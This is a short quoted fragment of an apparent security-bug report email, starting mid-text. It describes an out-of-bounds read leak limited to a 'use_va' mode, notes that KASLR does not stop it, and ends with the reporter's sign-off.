> reads. No memory corruption. KASLR does not prevent it (only the address 
> is randomized, the leaked content is constant). Only the use_va mode is 
> affected (the non-use_va path goes through GUP, which has an equivalent 
> check_range guard).
> 
> Please let me know if you need more detail.
> 
> Best regards,
> Haoran Wang <haoranwangsec@gmail.com>

